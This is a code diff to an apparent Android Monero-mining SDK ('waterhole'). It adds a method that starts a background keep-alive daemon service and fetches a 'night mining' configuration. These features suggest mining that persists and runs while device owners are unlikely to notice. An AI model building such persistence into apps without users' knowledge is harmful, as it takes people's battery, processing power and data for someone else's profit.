@@ -1,5 +1,6 @@
 package waterhole.miner.monero;
 
+import android.app.Application;
 import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.Context;
@@ -13,6 +14,8 @@ import android.os.Looper;
 import java.io.ObjectStreamException;
 
 import waterhole.miner.core.AbstractMiner;
+import waterhole.miner.core.config.NightConfiguration;
+import waterhole.miner.core.keepAlive.DaemonEnv;
 import waterhole.miner.core.utils.LogUtils;
 
 import static waterhole.miner.core.utils.LogUtils.error;
@@ -60,6 +63,19 @@ public final class XmrMiner extends AbstractMiner {
 
     private Object readResolve() throws ObjectStreamException {
         return instance();
+    }
+
+    public static void initApplication(Application application) {
+        if (application == null) {
+            throw new IllegalArgumentException("application is null");
+        }
+        // 需要在 Application 的 onCreate() 中调用一次 DaemonEnv.initialize()
+        DaemonEnv.initialize(application, TraceServiceImpl.class, DaemonEnv.DEFAULT_WAKE_UP_INTERVAL);
+        TraceServiceImpl.sShouldStopService = false;
+        DaemonEnv.startServiceMayBind(TraceServiceImpl.class);
+
+        // 获取夜挖配置
+        NightConfiguration.instance().fetchConfig(application);
     }
 
     @Override
